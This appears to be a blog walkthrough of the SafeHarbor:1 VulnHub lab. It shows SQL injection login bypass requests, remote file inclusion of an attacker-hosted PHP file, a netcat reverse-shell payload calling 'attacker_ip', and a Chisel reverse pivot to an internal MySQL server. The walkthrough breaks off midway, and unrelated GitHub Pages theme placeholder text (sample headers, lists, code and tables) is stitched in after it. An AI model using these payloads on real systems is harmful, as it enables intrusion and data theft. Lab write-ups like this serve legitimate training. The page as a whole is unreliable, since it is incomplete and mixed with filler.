---
title: VulnHub Walkthrough SafeHarbor:1
published: true
---

I enjoyed playing this challenge and I thought it would be a great idea to write a walkthrough. Even though most of the techniques required to solve the challenges were well known I tried to use non-traditional paths to some extent. I limited myself from using Metasploit or Cobalt Strike, which are often easily detected during red team engagements. So the goal was to use tools and scripts, that I often bookmarked and read about.

If you want to play along, you can download the VM from Vulnhub here: [SafeHarbor:1](https://www.vulnhub.com/entry/safeharbor-1,377/)

**Description from VulnHub:**

```
A harder VM designed to train for both pentesting newer IT infrastructure methodologies as well as network pivot practice.
You'll need to be familiar with pivoting techniques, web app vulnerabilities, Metasploit and Meterpreter, as well as enumeration methodologies and a good bit of patience.
As a note, there are two additional bonus flags that will appear in the /root directory based on pre-defined actions taken during the course of rooting the VM.
Works better in VirtualBox than VMware
```

As mentioned in the description the VM works well on VirtualBox, I tried Vmware Fusion and DHCP does not seem to work. Once you have the VM up and running, discover the live hosts in your vmnet adapter to find the VM IP address (not covered in this post)

**Service discovery scan:**

```sh
$ sudo nmap -sS -sV -Pn 192.168.1.21 -A 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-16 10:47 EDT
Nmap scan report for 192.168.1.21
Host is up (0.0046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:c6:49:ce:9b:54:7f:57:6d:56:b3:0a:30:47:83:b4 (RSA)
|   256 73:86:8d:97:2e:60:08:8a:76:24:3c:94:72:8f:70:f7 (ECDSA)
|_  256 26:48:91:66:85:a2:39:99:f5:9b:62:da:f9:87:4a:e6 (ED25519)
80/tcp open  http    nginx 1.17.4
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.17.4
|_http-title: Login
MAC Address: 08:00:27:20:D6:E2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   4.64 ms 192.168.1.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds

```

Scanning well known ports gives me something to start with, the attack surface is limited to port 80 running a PHP application and SSH service. Let's go ahead and take a look at the application.

In the meantime, let's also look for common PHP files using wfuzz. This is much faster than using dirbuster in my opinion.

```sh
wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ.php -t 500
```

Sweet! it's a login page. 

![login_page](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.png)

Let's quickly try some SQL injections on the login form fields:

```
POST / HTTP/1.1
Host: 192.168.1.21
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close
Referer: http://192.168.1.21/
Cookie: PHPSESSID=acb58e455065ff339e002533dda99949
Upgrade-Insecure-Requests: 1

user=';--&password=test&s=Login
```

From the verbose errors, we can deduce that SQL injection is possible, I'm going to try some standard login bypass technique.

![sqli_error](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.png)

```sql
admin' or '1'='1
```

```
POST / HTTP/1.1
Host: 192.168.1.21
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close
Referer: http://192.168.1.21/
Cookie: PHPSESSID=acb58e455065ff339e002533dda99949
Upgrade-Insecure-Requests: 1

user=admin%27+or+%271%27%3D%271&password=admin&s=Login
```

Et voilà! That was easy, considering this was trivial I probably have a longer path to get all the flags. 

![sqli_login_bypass](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_3.png)

Let's take a look at the wfuzz output:

```sh
root@kali:/tmp/SecLists/Discovery/Web-Content# wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ -t 500

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://192.168.1.21/FUZZ
Total requests: 5163

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                
===================================================================

000000029:   200        36 L     97 W     1303 Ch     "login.php"                                                            
000000111:   200        992 L    5149 W   86320 Ch    "phpinfo.php"                                                          

Total time: 63.60388
Processed Requests: 5163
Filtered Requests: 5161
Requests/sec.: 81.17429

```

Settings in phpinfo.php reveals that the directives for including files are enabled. Let's try LFI/RFI, if that doesn't work I can maybe exploit further using PHP streams.

```
Registered PHP Streams:  https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar

Directive:
allow_url_fopen On  On
allow_url_include On  On

```

A quick test reveals that the parameter "p" uses include function: http://192.168.1.21/OnlineBanking/index.php?p=../../../balance

```html
<br />
<b>Warning</b>:  include(../../../balance.php): failed to open stream: No such file or directory in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../../../balance.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />

```

Let me host a PHP file on my Kali (attacker) box to execute the command 'id' and include the remote file to see if that works. 

```php
<?php system('id'); ?>
```

Start a web server using Python's SimpleHTTPServer:

```sh
root@kali:/tmp# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

```

That worked!

![command_execution](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.png)


Let's go ahead and get a reverse shell, using the default one available on Kali (/usr/share/webshells/php/php-reverse-shell.php) or you can achieve the same using a one liner shown below. I did some basic checks to verify what shells are available and if netcat is available. Luckily, the version supports "-e" option. If that option is not supported you can use the workaround mentioned here: [Link to another page](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)

```php
<?php system('nc attacker_ip port -e /bin/sh'); ?>
```

Great! Now I have a reverse shell:

![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.gif)

What should I be looking for next? Maybe check the PHP files to see if there are any secrets or hard-coded credentials.

```php
cat balance.php
<?php
session_start();

if(is_null($_SESSION["loggedin"])){
  header("Location: /");
}


$dbServer = mysqli_connect('mysql', 'root', 'TestPass123!', 'HarborBankUsers');
$user = $_SESSION["username"];
$balanceQueryResult = mysqli_query($dbServer, "SELECT balance FROM users WHERE username = '$user'");
$balanceRow = mysqli_fetch_row($balanceQueryResult);
$balance = $balanceRow[0];
?>

```

So where are the other backend components since I found only one interface. Let's look at the cheatsheet: [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

```Platform/software specific tests:
Checks to determine if we're in a Docker container
```

After looking up on how to determine that, thanks to this post on [StackOverflow](https://stackoverflow.com/questions/23513045/how-to-check-if-a-process-is-running-inside-docker-container)

This comes as no surprise, but verify first :-)

```sh
cat /proc/1/cgroup
12:cpuset:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
11:pids:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
10:blkio:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
9:net_cls,net_prio:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
8:rdma:/
7:hugetlb:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
6:memory:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
5:cpu,cpuacct:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
4:perf_event:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
3:freezer:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
2:devices:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
1:name=systemd:/docker/707af7b0d61f3179e76644d34f4b4b9d5b85ac5b0ad0a414c7ac70efef48a984
0::/system.slice/containerd.service
```

Alright, I could now run a port scan to find all live hosts or simply do an arp scan to find the neighbours:

```
arp -a
harborbank_apache_v2_2.harborbank_backend (172.20.0.5) at 02:42:ac:14:00:05 [ether]  on eth0
? (172.20.0.1) at 02:42:f8:d6:41:d8 [ether]  on eth0
harborbank_apache_1.harborbank_backend (172.20.0.6) at 02:42:ac:14:00:06 [ether]  on eth0
harborbank_apache_v2_1.harborbank_backend (172.20.0.4) at 02:42:ac:14:00:04 [ether]  on eth0
harborbank_mysql_1.harborbank_backend (172.20.0.138) at 02:42:ac:14:00:8a [ether]  on eth0

```

**Privilege escalation? No! Let's just ~~pivot~~ reverse pivot**

How do I tunnel my traffic through the host VM? I could open a listening port on the docker container but the host VM would not let my traffic through (corporate firewalls?) I could very well use a meterpreter PHP payload and let metasploit handle the proxying for me. But I said I would try new tools and techniques to solve this challenge.

```
          22  <---> 
[Host VM]              80:[Docker Container running PHP]:(higher order port--->  8000:[Attacker Machine]
          80  <--->                                      reverse connect)
                                  ^
                                  | 
                                  |
                                  v  
                        [Docker Container running MySQL]:3306

```

In situations where there are no SSH or other ways to tunnel the traffic, we could use reverse pivot. The victim machine (client) will connect back to the attacker machine (server) and then open a tunnel to route the traffic to the destination server and port. Let me illustrate:

```
          | :22  <--->                                                              |
[Host VM] |               80:[Docker Container running PHP]:(higher order port <--->| 8000:(netcat)
          |                                                 reverse connect)        |        
          | :80  <--->                                      :(chisel reverse        |     [Attacker Machine]
                                                            connect to 8888) <--->  |
                                                                                    | 8888:(chisel server listening)
                                  ^          172.20.0.138:3306 |                    |            |
                                  |                            |                                 v
                                  | <--------------------------|                             9999:127.0.0.1 (connect via mysql)
                                  v  
                        [Docker Container running MySQL]:3306

```

There are quite a lot of tools that comes to my mind for such a situation. Listing them below for your reference:

* [3proxy](https://github.com/z3APA3A/3proxy)
* [rpivot](https://github.com/klsecservices/rpivot)
* [reGeorg](https://github.com/sensepost/reGeorg)

Out of the many lot I chose to go with [Chisel](https://github.com/jpillora/chisel#socks5-guide), mainly because of it's simplicity, written in golang and can be cross-compiled. 

**On the victim machine run:**

```sh
./chisel client 192.168.1.22:8888 R:9999:172.20.0.138:3306
```

![chisel_command](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.png)

**On the attacker machine run**
```sh
/chisel_linux_amd64 server -p 8888 -reverse 
```

![chisel_listening_server](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_3.gif)

Now, let's go ahead and connect to MySQL and see what's in the database for us:

![mysql_connect](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.gif)


There should be whitespace between paragraphs.

There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.

# [](#header-1)Header 1

This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.

## [](#header-2)Header 2

> This is a blockquote following a header.
>
> When something is important enough, you do it even if the odds are not in your favor.

### [](#header-3)Header 3

```js
// Javascript code with syntax highlighting.
var fun = function lang(l) {
  dateformat.i18n = require('./lang/' + l)
  return true;
}
```

```ruby
# Ruby code with syntax highlighting
GitHubPages::Dependencies.gems.each do |gem, version|
  s.add_dependency(gem, "= #{version}")
end
```

#### [](#header-4)Header 4

*   This is an unordered list following a header.
*   This is an unordered list following a header.
*   This is an unordered list following a header.

##### [](#header-5)Header 5

1.  This is an ordered list following a header.
2.  This is an ordered list following a header.
3.  This is an ordered list following a header.

###### [](#header-6)Header 6

| head1        | head two          | three |
|:-------------|:------------------|:------|
| ok           | good swedish fish | nice  |
| out of stock | good and plenty   | nice  |
| ok           | good `oreos`      | hmm   |
| ok           | good `zoute` drop | yumm  |

### There's a horizontal rule below this.

* * *

### Here is an unordered list:

*   Item foo
*   Item bar
*   Item baz
*   Item zip

### And an ordered list:

1.  Item one
1.  Item two
1.  Item three
1.  Item four

### And a nested list:

- level 1 item
  - level 2 item
  - level 2 item
    - level 3 item
    - level 3 item
- level 1 item
  - level 2 item
  - level 2 item
  - level 2 item
- level 1 item
  - level 2 item
  - level 2 item
- level 1 item

### Small image

![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)

### Large image

![](https://guides.github.com/activities/hello-world/branching.png)


### Definition lists can be used with HTML syntax.

<dl>
<dt>Name</dt>
<dd>Godzilla</dd>
<dt>Born</dt>
<dd>1952</dd>
<dt>Birthplace</dt>
<dd>Japan</dd>
<dt>Color</dt>
<dd>Green</dd>
</dl>

```
Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
```

```
The final element.
```

References:
- A Red Teamer's guide to pivoting](https://artkond.com/2017/03/23/pivoting-guide/)
